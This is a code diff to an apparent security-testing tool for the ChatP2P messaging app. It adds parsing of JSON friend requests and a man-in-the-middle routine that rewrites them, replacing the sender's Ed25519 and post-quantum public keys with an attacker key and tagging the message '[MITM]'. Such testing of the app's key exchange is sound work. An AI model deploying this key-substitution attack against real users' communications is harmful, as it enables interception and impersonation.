@@ -232,7 +232,37 @@ namespace ChatP2P.SecurityTester.Crypto
         {
             try
             {
-                // 🔍 Parser différents formats ChatP2P
+                // 🔍 Parser différents formats ChatP2P (JSON API + legacy)
+
+                // Format JSON API
+                if (friendRequest.Contains("\"Action\":\"receive_friend_request\"") ||
+                    friendRequest.Contains("\"Action\":\"send_friend_request\""))
+                {
+                    try
+                    {
+                        using var doc = System.Text.Json.JsonDocument.Parse(friendRequest);
+                        var root = doc.RootElement;
+
+                        if (root.TryGetProperty("Data", out var data))
+                        {
+                            return new FriendRequestInfo
+                            {
+                                Type = "JSON_API_FRIEND_REQUEST",
+                                FromPeer = data.TryGetProperty("fromPeer", out var from) ? from.GetString() ?? "" : "",
+                                ToPeer = data.TryGetProperty("toPeer", out var to) ? to.GetString() ?? "" : "",
+                                Ed25519Key = data.TryGetProperty("ed25519Key", out var ed25519) ? ed25519.GetString() ?? "" : "",
+                                PQCKey = data.TryGetProperty("pqcKey", out var pqc) ? pqc.GetString() ?? "" : "",
+                                Message = data.TryGetProperty("message", out var msg) ? msg.GetString() ?? "" : ""
+                            };
+                        }
+                    }
+                    catch (System.Text.Json.JsonException)
+                    {
+                        // Fall through to legacy parsing
+                    }
+                }
+
+                // Format legacy
                 if (friendRequest.Contains("FRIEND_REQ_DUAL:"))
                 {
                     // Format: FRIEND_REQ_DUAL:fromPeer:toPeer:ed25519KeyB64:pqcKeyB64:message
@@ -279,7 +309,25 @@ namespace ChatP2P.SecurityTester.Crypto
             // 🕷️ Remplacer clés originales par clés attaquant
             var attackerKeyB64 = Convert.ToBase64String(_attackerEd25519PublicKey ?? Array.Empty<byte>());
 
-            if (originalRequest.Type == "FRIEND_REQ_DUAL")
+            if (originalRequest.Type == "JSON_API_FRIEND_REQUEST")
+            {
+                // Créer JSON API malicieux avec nos clés
+                var maliciousJson = System.Text.Json.JsonSerializer.Serialize(new
+                {
+                    Command = "contacts",
+                    Action = "receive_friend_request",
+                    Data = new
+                    {
+                        fromPeer = originalRequest.FromPeer,
+                        toPeer = originalRequest.ToPeer,
+                        ed25519Key = attackerKeyB64,
+                        pqcKey = attackerKeyB64,
+                        message = $"[MITM] {originalRequest.Message}"
+                    }
+                });
+                return maliciousJson;
+            }
+            else if (originalRequest.Type == "FRIEND_REQ_DUAL")
             {
                 return $"FRIEND_REQ_DUAL:{originalRequest.FromPeer}:{originalRequest.ToPeer}:{attackerKeyB64}:{attackerKeyB64}:{originalRequest.Message}";
             }
